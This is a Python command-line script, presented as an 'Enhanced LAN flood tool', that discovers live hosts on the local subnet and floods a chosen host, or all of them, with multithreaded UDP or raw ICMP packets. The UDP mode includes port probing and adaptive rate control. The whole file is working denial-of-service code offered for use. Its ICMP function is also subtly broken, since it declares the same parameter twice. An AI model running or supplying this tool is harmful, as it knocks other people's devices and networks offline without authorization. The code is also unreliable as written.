```python
#!/usr/bin/env python3
import argparse
import threading
import socket
import random
import sys
import time
import subprocess
import errno
import asyncio

from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
from manuf import manuf
import aioping  # pip install aioping

# === Asynchronous LAN Scan ===
async def async_ping(ip: str) -> bool:
    try:
        await aioping.ping(ip, timeout=1)
        return True
    except:
        return False

async def scan_lan_async() -> list[str]:
    # Determine local /24 base
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
    except:
        print("[-] Cannot determine local IP.")
        sys.exit(1)
    finally:
        s.close()
    parts = local_ip.split('.')[:3]
    base = '.'.join(parts) + '.'
    ips = [f"{base}{i}" for i in range(1,255) if f"{base}{i}" != local_ip]
    tasks = [async_ping(ip) for ip in ips]
    results = await asyncio.gather(*tasks)
    return sorted([ip for ip, ok in zip(ips, results) if ok],
                  key=lambda ip: list(map(int, ip.split('.'))))

# === Vendor Resolution ===
def resolve_vendors(hosts: list[str]) -> list[tuple[str,str,str]]:
    proc = subprocess.run(["ip","neigh"], capture_output=True, text=True)
    neigh = {}
    for line in proc.stdout.splitlines():
        parts = line.split()
        if len(parts)>=5 and parts[2]=="lladdr":
            neigh[parts[0]] = parts[4]
    parser = manuf.MacParser()
    out = []
    for ip in hosts:
        mac = neigh.get(ip)
        if not mac or mac.count(':')!=5:
            vendor = "Unknown"
        else:
            try:
                vendor = parser.get_manuf(mac) or "Unknown"
            except:
                vendor = "Unknown"
        out.append((ip, mac or 'n/a', vendor))
    return out

# === UDP Port Probe ===
def probe_udp_port(ip: str, port: int, timeout: float=1.0) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(b"",(ip,port))
        sock.recvfrom(1024)
        return True
    except socket.timeout:
        return True
    except socket.error as e:
        return False if e.errno==errno.ECONNREFUSED else True
    finally:
        sock.close()

def pick_best_udp_port(ip: str) -> int:
    for p in [53,161,123,500,67,68]:
        print(f"[*] Probing UDP/{p}…", end=' ')
        if probe_udp_port(ip,p):
            print("open/filtered")
            return p
        print("closed")
    print("[!] Fallback to random ports (0)")
    return 0

# === Dynamic Rate Controller ===
class RateController:
    def __init__(self, target_rtt_ms: float=50.0):
        self.target = target_rtt_ms
        self.rate = 1.0
    def adjust(self, current_rtt: float) -> float:
        if current_rtt > self.target:
            self.rate *= 0.9
        else:
            self.rate *= 1.1
        self.rate = max(0.1, min(self.rate, 10.0))
        return self.rate

# === Flood Modes ===
def flood_udp(ip, port, packet_size, duration, threads, iface, rate_ctrl):
    counts = [0]*threads
    deadline = time.time() + duration
    def worker(tid):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
            if iface: sock.setsockopt(socket.SOL_SOCKET,25,iface.encode()+b"\0")
        except:
            pass
        payload = random._urandom(packet_size)
        rnd = random.randint
        batch = 64
        next_adj = time.time()+1
        dst = (ip,port)
        sent = 0
        while time.time()<deadline:
            for _ in range(batch):
                try:
                    if port==0:
                        sock.sendto(payload,(ip,rnd(1,65535)))
                    else:
                        sock.sendto(payload,dst)
                    sent+=1
                except:
                    pass
            if time.time()>=next_adj:
                # measure RTT
                try:
                    out = subprocess.check_output(
                        ["ping","-c","1","-W","1",ip],
                        text=True)
                    # parse time=
                    t = float(out.split("time=")[1].split()[0])
                except:
                    t = rate_ctrl.target
                r = rate_ctrl.adjust(t)
                batch = int(64*r) or 1
                next_adj += 1
        counts[tid]=sent
    for i in range(threads): threading.Thread(target=worker,args=(i,),daemon=True).start()
    return counts


def flood_icmp(ip, _, packet_size, duration, threads, iface, _):
    counts=[0]*threads
    import struct, os
    ICMP_ECHO=8
    def checksum(data: bytes):
        if len(data)%2: data+=b"\0"
        s=0
        for i in range(0,len(data),2): s+=(data[i]<<8)+data[i+1]
        s=(s>>16)+(s&0xffff); s+=s>>16
        return (~s)&0xffff
    def worker(tid):
        try:
            sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
            if iface: sock.setsockopt(socket.SOL_SOCKET,25,iface.encode()+b"\0")
        except:
            return
        pid=os.getpid()&0xffff; seq=0; deadline=time.time()+duration; sent=0
        while time.time()<deadline:
            seq=(seq+1)&0xffff
            hdr=struct.pack('!BBHHH',ICMP_ECHO,0,0,pid,seq)
            payload=random._urandom(packet_size-len(hdr))
            ch=checksum(hdr+payload)
            pkt=struct.pack('!BBHHH',ICMP_ECHO,0,ch,pid,seq)+payload
            try:
                sock.sendto(pkt,(ip,0)); sent+=1
            except:
                pass
        counts[tid]=sent
    for i in range(threads): threading.Thread(target=worker,args=(i,),daemon=True).start()
    return counts

# Note: TCP SYN mode would require scapy; omitted for brevity

# === Main ===
def main():
    p=argparse.ArgumentParser(description="Enhanced LAN flood tool")
    p.add_argument("--mode",choices=["udp","icmp"],default="udp")
    p.add_argument("--autoport",action="store_true")
    p.add_argument("-s","--packet-size",type=int)
    p.add_argument("-d","--duration",type=int)
    p.add_argument("-t","--threads",type=int)
    p.add_argument("-i","--iface",default="")
    args=p.parse_args()

    # async scan
    hosts=asyncio.run(scan_lan_async())
    info=resolve_vendors(hosts)
    print("\nLive hosts:")
    for idx,(ip,mac,vendor) in enumerate(info,1):
        print(f"  {idx:3d}) {ip:16s} {mac:17s} {vendor}")
    print("    0) ALL hosts")
    sel=input(f"Select target (0–{len(info)}): ").strip()
    if sel=="0": targets=[ip for ip,_,_ in info]
    else: targets=[info[int(sel)-1][0]]

    # port
    port=0
    if args.mode=="udp":
        if args.autoport and len(targets)==1:
            port=pick_best_udp_port(targets[0])
    # params
    if args.packet_size is None: args.packet_size=int(input("Packet size: "))
    if args.duration is None: args.duration=int(input("Duration: "))
    if args.threads is None: args.threads=int(input("Threads per target: "))
    iface=args.iface or None

    print(f"\n[*] Mode={args.mode} Targets={len(targets)} Port={port} "
          f"Size={args.packet_size} Duration={args.duration}s Threads={args.threads} "
          f"Iface={iface or 'default'}")

    rate_ctrl=RateController()
    all_counts={}
    # launch floods
    for ip in targets:
        if args.mode=="udp":
            counts=flood_udp(ip,port,args.packet_size,args.duration,args.threads,iface,rate_ctrl)
        else:
            counts=flood_icmp(ip,port,args.packet_size,args.duration,args.threads,iface,rate_ctrl)
        all_counts[ip]=counts

    # wait duration
    for _ in tqdm(range(args.duration),desc="Flooding",unit="s"): time.sleep(1)

    # summary
    total=0
    print("\n[*] Complete. Packets sent:")
    for ip,counts in all_counts.items():
        s=sum(counts); total+=s
        print(f"  {ip:16s} {s:,}")
    print(f"  Grand total: {total:,}")

if __name__=="__main__": main()
```
